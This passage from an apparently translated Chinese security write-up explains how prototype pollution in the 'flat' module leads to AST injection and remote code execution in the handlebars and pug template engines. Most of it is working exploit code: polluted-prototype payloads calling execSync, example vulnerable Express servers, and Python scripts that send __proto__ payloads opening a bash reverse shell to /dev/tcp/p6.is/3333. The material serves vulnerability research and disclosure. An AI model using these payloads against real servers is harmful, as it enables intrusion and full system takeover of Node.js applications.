        this.isSimple = bodyLength === 1;
        this.blockParams = program.blockParams ? program.blockParams.length : 0;
        return this;
    }
    ...
`compiler`接收到 `AST 对象(AST Object)`（实际上是一个字符串）并将其传到 `accept`方法。
`accept`方法调用`Compiler`的 `this[node.type]`。
然后获取 `AST`的 `body` 属性并将其用于构造函数。
    const Handlebars = require('handlebars');
    Object.prototype.type = 'Program';
    Object.prototype.body = [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }];
    const source = `Hello {{ msg }}`;
    const template = Handlebars.precompile(source);
    console.log(eval('(' + template + ')')['main'].toString());
    /*
    function (container, depth0, helpers, partials, data) {
        var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
            if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
                return parent[propertyName];
            }
            return undefined
        };
        return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
            "name": "undefined",
            "hash": {},
            "data": data,
            "loc": {
                "start": 0,
                "end": 0
            }
        })) != null ? stack1 : "");
    }
    */
所以，你可以构造一个像这样的攻击。
如果您已经通过`parser`，请指定一个无法分配给 `NumberLiteral` 值的字符串。
但是注入 AST 之后，我们可以将任何代码插入到函数中。
## _Example_
    const express = require('express');
    const { unflatten } = require('flat');
    const bodyParser = require('body-parser');
    const Handlebars  = require('handlebars');
    const app = express();
    app.use(bodyParser.json())
    app.get('/', function (req, res) {
        var source = "It works!";
        var template = Handlebars.compile(source);
        res.end(template({}));
    });
    app.post('/vulnerable', function (req, res) {
        let object = unflatten(req.body);
        res.json(object);
    });
    app.listen(3000);
使用具有原型污染漏洞的`flat`模块配置一个有漏洞的服务器示例。
`flat`是一个受欢迎的模块，每周有 461 万次下载
    import requestsTARGET_URL = 'http://p6.is:3000'# make pollutionrequests.post(TARGET_URL + '/vulnerable', json = {    "__proto__.type": "Program",    "__proto__.body": [{        "type": "MustacheStatement",        "path": 0,        "params": [{            "type": "NumberLiteral",            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"        }],        "loc": {            "start": 0,            "end": 0        }    }]})# executerequests.get(TARGET_URL)
在获取反弹的shell之后，我们可以执行任意系统命令！
# pug
截至文章编辑之时，`pug`的总下载量为 `65,827,719` 次。
`pug`是一个先前以`jade`名称开发并重命名的模块。 据统计，它是 `nodejs`中第四大最受欢迎的模板引擎
## _如何探测_
    const pug = require('pug');const source = `h1= msg`;var fn = pug.compile(source);var html = fn({msg: 'It works'});console.log(html); // It works
在 `pug`中使用模板的常见方法如上所示。
`pug.compile` 函数将字符串转换为模板函数并传递对象以供调用。
    const pug = require('pug');Object.prototype.block = {"type":"Text","val":``};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // It works
这是一种利用原型污染在黑盒环境下探测使用`pug`模板引擎的方法。
当你将 `AST` 插入`Object.prototype.block`时，compiler(编译器)通过引用 `val` 将其添加到缓冲区中。
    switch (ast.type) {    case 'NamedBlock':    case 'Block':        ast.nodes = walkAndMergeNodes(ast.nodes);        break;    case 'Case':    case 'Filter':    case 'Mixin':    case 'Tag':    case 'InterpolatedTag':    case 'When':    case 'Code':    case 'While':        if (ast.block) {        ast.block = walkAST(ast.block, before, after, options);        }        break;    ...
当`ast.type`为`While`时，`ast.block`调用`walkASK`（如果值不存在，则引用`prototype`）
如果模板引用参数中的任何值，则`While` 节点始终存在，因此可靠性被认为是相当高的。
事实上，如果开发人员不会从模板中的参数中引用任何值 。
因为他们一开始并不会使用任何模板引擎。
## _Exploit_
`pug`工作原理如上图所示。
与`handlebars`不同的是，每个过程都被分成一个单独的模块。
`pug-parser` 生成的 `AST`被传递给 `pug-code-gen`并制成一个函数。最后，它将被执行。
    if (debug && node.debug !== false && node.type !== 'Block') {    if (node.line) {        var js = ';pug_debug_line = ' + node.line;        if (node.filename)            js += ';pug_debug_filename = ' + stringify(node.filename);        this.buf.push(js + ';');    }}
在 `pug` 的compiler(编译器)中，有一个变量存放着名为 `pug_debug_line`的行号，用于调试。
如果 `node.line` 值存在，则将其添加到缓冲区，否则传递。
对于使用 `pug-parser` 生成的 `AST`，`node.line` 值始终指定为整数。
但是，我们可以通过 `AST注入`在 `node.line` 中插入一个非整型的字符串并导致任意代码执行。
    const pug = require('pug');Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};const source = `h1= msg`;var fn = pug.compile(source, {});console.log(fn.toString());/*function template(locals) {    var pug_html = "",        pug_mixins = {},        pug_interp;    var pug_debug_filename, pug_debug_line;    try {;        var locals_for_with = (locals || {});        (function (console, msg, process) {;            pug_debug_line = 1;            pug_html = pug_html + "\u003Ch1\u003E";;            pug_debug_line = 1;            pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? "" : pug_interp));;            pug_debug_line = console.log(process.mainModule.require('child_process').execSync('id').toString());            pug_html = pug_html + "ndefine\u003C\u002Fh1\u003E";        }.call(this, "console" in locals_for_with ?            locals_for_with.console :            typeof console !== 'undefined' ? console : undefined, "msg" in locals_for_with ?            locals_for_with.msg :            typeof msg !== 'undefined' ? msg : undefined, "process" in locals_for_with ?            locals_for_with.process :            typeof process !== 'undefined' ? process : undefined));;    } catch (err) {        pug.rethrow(err, pug_debug_filename, pug_debug_line);    };    return pug_html;}*/
生成函数的示例。
你可以看到 `Object.prototype.line`值插入在 `pug_debug_line` 定义的右侧。
    const pug = require('pug');Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('id').toString())"};const source = `h1= msg`;var fn = pug.compile(source);var html = fn({msg: 'It works'});console.log(html); // "uid=0(root) gid=0(root) groups=0(root)\n\nIt worksndefine"
所以，你可以构造一个像这样的攻击。
通过在 `node.line`值中指定一个字符串，它总是通过解析器定义为数字。
所以，任何命令都可以插入到函数中。
## Example
    const express = require('express');const { unflatten } = require('flat');const pug = require('pug');const app = express();app.use(require('body-parser').json())app.get('/', function (req, res) {    const template = pug.compile(`h1= msg`);    res.end(template({msg: 'It works'}));});app.post('/vulnerable', function (req, res) {    let object = unflatten(req.body);    res.json(object);}); app.listen(3000);
在`handlebars`的例子中，`flat` 用于配置服务器。 模板引擎已改为 `pug`
    import requestsTARGET_URL = 'http://p6.is:3000'# make pollutionrequests.post(TARGET_URL + '/vulnerable', json = {    "__proto__.block": {        "type": "Text",         "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"    }})# executerequests.get(TARGET_URL)
我们可以在 `block.line`中插入任何代码，并获得一个 反弹shell。
# 结论
我描述了如何执行任意命令， 通过`JS 模板引擎`上的`AST 注入`。
事实上，这些部分很难完全修复 所以我希望这会像`EJS`一样。